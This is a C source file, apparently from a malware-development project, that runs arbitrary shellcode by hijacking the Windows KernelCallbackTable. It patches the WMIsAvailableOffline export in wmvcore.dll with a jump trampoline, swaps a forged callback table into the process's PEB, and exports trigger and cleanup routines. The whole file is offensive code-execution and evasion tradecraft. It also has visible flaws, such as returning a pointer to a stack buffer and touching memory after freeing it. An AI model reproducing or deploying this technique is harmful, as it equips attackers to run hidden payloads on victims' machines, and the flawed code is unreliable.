#include <Windows.h>
#include <stdio.h>
#include "Struct.h"



typedef unsigned long long uint64_t;
typedef unsigned char      uint8_t;

// ;)
#define KctSize sizeof KERNELCALLBACKTABLE
#define PebSize sizeof PEB


// --------------------------------------- //
#define FAILEDTO_GET_DLL_OR_API  100
#define FAILEDTO_PLACE_JMPSHELL  200
#define KCT_PNTR_IS_NULL		 300
#define VIRTUAL_API_ERROR		 400
#define NO_ERROR_RETURNED		 500
// --------------------------------------- //

typedef struct _InfoStruct {
	PVOID   pWMIAO; 		// pointer to WMIsAvailableOffline api
	SIZE_T  SizeOfJmpShell; // size of the trampoline shellcode [13 byte]
	HMODULE hWMVCore; 		// wmvcore.dll handle
	PVOID   OldpWMIAO; 		// this will reserve the old 13 bytes (before replacement with the jmp shellcode) 
	DWORD   OldProtect;		// the old protection (before modifying the code/protection)
	PVOID   pNewKct; 		// pointer to the newly allocated kct (to decommit later on cleanup)
}InfoStruct, * PInfoStruct;

InfoStruct Info = { 0 };

// https://github.com/mgeeky/ThreadStackSpoofer/blob/fce3a52d15becf671b52b6f9309ccccdc8aeb2ec/ThreadStackSpoofer/main.cpp#L44
uint8_t* Trampoline(PVOID JumpToAddress, PSIZE_T SizeOfJmpShell) {
	uint8_t trampoline[] = {
			0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, JumpToAddress
			0x41, 0xFF, 0xE2                                            // jmp r10
	};

	uint64_t addr = (uint64_t)(JumpToAddress);
	memcpy(&trampoline[2], &addr, sizeof(addr));
	*SizeOfJmpShell = sizeof trampoline;
	return trampoline;
}


BOOL PlaceJmpShell(PVOID pWMIAO, PVOID JmpShell, SIZE_T SizeofJmpShell) {
	DWORD Old;

	if (!VirtualProtect(pWMIAO, SizeofJmpShell, PAGE_READWRITE, &Old)) {
		//printf("[!] [PlaceJmpShell] VirtualProtect [1] Failed : %d \n", GetLastError());
		return FALSE;
	}

	Info.OldProtect = Old;
	Info.OldpWMIAO = malloc(SizeofJmpShell);
	memcpy(Info.OldpWMIAO, pWMIAO, SizeofJmpShell);
	memcpy(pWMIAO, JmpShell, SizeofJmpShell);

	if (!VirtualProtect(pWMIAO, SizeofJmpShell, PAGE_EXECUTE, &Old)) {
		//printf("[!] [PlaceJmpShell] VirtualProtect [2] Failed : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}



BOOL FillIn() {
	HMODULE hWMVCore = LoadLibraryA("wmvcore.dll");
	PVOID pWMIAO = GetProcAddress(hWMVCore, "WMIsAvailableOffline");
	Info.hWMVCore = hWMVCore;
	Info.pWMIAO = pWMIAO;
	if (Info.hWMVCore != NULL && Info.pWMIAO != NULL) {
		return TRUE;
	}
	return FALSE;
}


// exported by name
BOOL RunViaKctHijack(PVOID pAddress, PDWORD Error) {
	KERNELCALLBACKTABLE kct = { 0 };
	KERNELCALLBACKTABLE Newkct = { 0 };
	PVOID pNewkct = NULL;
	PEB Peb = { 0 };
	PPEB pPeb = (PPEB)__readgsqword(0x60);
	DWORD Old;

	if (!FillIn()) {
		*Error = FAILEDTO_GET_DLL_OR_API;
		return FALSE;
	}

	if (!PlaceJmpShell(Info.pWMIAO, (PVOID)Trampoline(pAddress, &Info.SizeOfJmpShell), Info.SizeOfJmpShell)) {
		*Error = FAILEDTO_PLACE_JMPSHELL;
		return FALSE;
	}

	memcpy(&Peb, pPeb, PebSize);
	if (Peb.KernelCallbackTable == NULL) {
		*Error = KCT_PNTR_IS_NULL;
		return FALSE;
	}
	memcpy(&kct, Peb.KernelCallbackTable, KctSize);
	memcpy(&Newkct, &kct, KctSize);
	Newkct.__fnDWORD = (ULONG_PTR)Info.pWMIAO;

	if ((pNewkct = VirtualAlloc(NULL, KctSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL) {
		//printf("[!] VirtualAlloc Failed With Error: %d \n", GetLastError());
		*Error = VIRTUAL_API_ERROR;
		return FALSE;
	}

	memcpy(pNewkct, &Newkct, KctSize);
	Info.pNewKct = pNewkct;
	//printf("[+] pNewKct : 0x%p \n", (PVOID)pNewkct);

	if (!VirtualProtect(pPeb, PebSize, PAGE_READWRITE, &Old)) {
		//printf("[!] VirtualProtect [1] Failed With Error: %d \n", GetLastError());
		*Error = VIRTUAL_API_ERROR;
		return FALSE;
	}

	RtlMoveMemory((PBYTE)pPeb + offsetof(PEB, KernelCallbackTable), &pNewkct, sizeof(ULONG_PTR));
	/*
		In case You need to clean up the 'ULONG_PTR' new pointer in the peb, you need to re-run VirtualProtect on peb,
		so that you can re-patch it to a 'Old ULONG_PTR', or you can just skip the next VirtualProtect and run it in cleanup
		function, this way you can still re-patch, without changing permitions again ...
	*/

	if (!VirtualProtect(pPeb, PebSize, Old, &Old)) {
		//printf("[!] VirtualProtect [2] Failed With Error: %d \n", GetLastError());
		*Error = VIRTUAL_API_ERROR;
		return FALSE;
	}
	*Error = NO_ERROR_RETURNED;
	return TRUE;
}



// exported by name
HANDLE TriggerShellcode() {
	MessageBoxA(NULL, "Pew", "Pew", MB_OK);
	return CreateEventA(NULL, TRUE, FALSE, NULL);
}



// exported by name
BOOL CleanUp() {
	DWORD Old;
	VirtualProtect(Info.pWMIAO, Info.SizeOfJmpShell, PAGE_READWRITE, &Old);
	memcpy(Info.pWMIAO, Info.OldpWMIAO, Info.SizeOfJmpShell);
	free(Info.OldpWMIAO);
	ZeroMemory(Info.OldpWMIAO, Info.SizeOfJmpShell);
	ZeroMemory(Info.pNewKct, KctSize);
	return ((VirtualProtect(Info.pWMIAO, Info.SizeOfJmpShell, Info.OldProtect, &Info.OldProtect)
		& FreeLibrary(Info.hWMVCore))
		& VirtualFree(Info.pNewKct, KctSize, MEM_DECOMMIT));
}
